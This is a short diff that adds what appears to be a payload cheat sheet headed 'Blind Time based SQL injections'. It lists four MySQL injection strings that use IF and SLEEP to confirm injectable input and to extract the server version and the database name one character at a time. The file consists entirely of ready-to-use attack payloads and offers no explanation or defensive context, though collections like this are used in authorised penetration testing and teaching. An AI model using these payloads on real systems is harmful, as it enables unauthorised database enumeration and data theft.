@@ -1,0 +1,6 @@
+Blind Time based SQL injections :~
+
+' OR IF(1=1,SLEEP(5),0)--
+' OR IF(1=2,SLEEP(5),0)--
+' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--
+' AND IF(ASCII(SUBSTRING(database(),1,1))=115,SLEEP(5),0)--
